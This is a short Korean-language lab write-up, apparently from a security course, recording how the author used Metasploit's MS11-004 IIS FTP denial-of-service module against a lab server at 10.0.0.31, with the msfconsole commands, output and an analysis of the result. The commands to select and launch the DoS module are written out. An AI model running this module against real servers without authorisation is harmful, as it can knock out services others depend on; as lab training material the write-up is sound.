# MS11-004 IIS FTP 취약점 점검 실습

## 1. 실습 목적

취약하게 구성한 Windows IIS FTP 서버를 대상으로
Metasploit의 `ms11-004` 관련 모듈을 사용하여 취약점 존재 여부를 확인한다.

---

## 2. 실습 환경

| 구분     | 내용                                           |
| ------ | -------------------------------------------- |
| 공격자    | Kali Linux                                   |
| 대상     | Windows IIS FTP Server                       |
| 대상 IP  | 10.0.0.31                                    |
| 대상 서비스 | FTP                                          |
| 포트     | TCP 21                                       |
| 도구     | Metasploit Framework                         |
| 모듈     | auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof |

---

## 3. Metasploit 실행

```bash
msfconsole
```

---

## 4. 모듈 검색

처음에는 오타로 인해 검색 결과가 나오지 않았다.

```text
search ms711-010
search ms71-010
```

정확한 키워드로 다시 검색하였다.

```text
search ms11-004
```

검색 결과:

```text
auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof
Microsoft IIS FTP Server Encoded Response Overflow Trigger
```

---

## 5. 모듈 선택

```text
use auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof
```

옵션 확인:

```text
show options
```

기본 옵션:

| 옵션     | 값     | 설명     |
| ------ | ----- | ------ |
| RHOSTS | 비어 있음 | 대상 IP  |
| RPORT  | 21    | FTP 포트 |

---

## 6. 대상 IP 설정

처음에는 잘못된 대상 IP로 실행하였다.

```text
set rhosts 10.0.0.3
run
```

이후 실제 취약 대상 서버인 `10.0.0.31`로 변경하였다.

```text
set rhosts 10.0.0.31
show options
run
```

---

## 7. 실행 결과

```text
[*] Running module against 10.0.0.31
[*] 10.0.0.31:21 - banner: 220 Microsoft FTP Service
[*] Auxiliary module execution completed
```

---

## 8. 결과 분석

대상 서버의 FTP 서비스가 정상적으로 응답하였다.

```text
220 Microsoft FTP Service
```

이는 `10.0.0.31` 서버에서 Microsoft IIS FTP 서비스가 TCP 21번 포트로 동작 중임을 의미한다.

해당 모듈은 exploit shell을 획득하는 모듈이 아니라
IIS FTP 서버의 특정 취약 동작을 유발하는 DoS 계열 auxiliary 모듈이다.

따라서 실행 후 세션이 생성되지 않는 것은 정상이다.

---

## 9. 정리

| 항목                | 결과                        |
| ----------------- | ------------------------- |
| FTP 서비스 응답        | 확인                        |
| FTP 배너            | 220 Microsoft FTP Service |
| Metasploit 모듈 실행  | 완료                        |
| Meterpreter 세션 생성 | 해당 없음                     |
| 실습 결과             | IIS FTP 취약점 점검 과정 확인      |

---

## 10. 참고

실습은 허가된 내부 실습 환경에서만 수행하였다.
